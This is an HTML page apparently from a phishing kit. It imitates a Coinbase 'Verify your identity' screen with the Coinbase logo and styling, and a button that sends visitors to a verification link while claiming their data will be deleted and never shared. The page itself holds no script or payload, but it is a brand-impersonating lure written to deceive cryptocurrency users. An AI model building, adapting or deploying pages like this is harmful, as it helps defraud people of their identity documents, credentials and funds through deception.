
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <link rel="icon" href="assets/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Verify Identity</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
  <link href="css/32.css" rel="stylesheet"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
#cb-vi-btn .cb-vi-ext {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 22px;
  height: 22px;
  border-radius: 6px;
  background: rgba(0,0,0,.14);
  pointer-events: none;
  flex-shrink: 0;
}
#cb-vi-btn .cb-vi-ext svg {
  display: block;
  width: 12px;
  height: 12px;
}
  </style>
</head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
      </path>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form action="#" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
       Verify your identity
      </span>
      <span class="font-coinbase-sans text-coinbase-foreground-muted my-4">
       Please visit the following link to verify your identity. Your information will be deleted after verification and will not be shared with anyone.
      </span>
      <button id="cb-vi-btn" class="bg-coinbase-primary hover:bg-[#507fe5] active:bg-[#4b78d6] active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center gap-2" type="button">
       Verify Identity
       <span class="cb-vi-ext" aria-hidden="true">
        <svg fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
         <path d="M14 5h5v5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"/>
         <path d="M13 11l6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"/>
         <path d="M19 13v5a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2"/>
        </svg>
       </span>
      </button>
     </form>
    </div>
   </div>
  </div>
  
 </body>
</html>
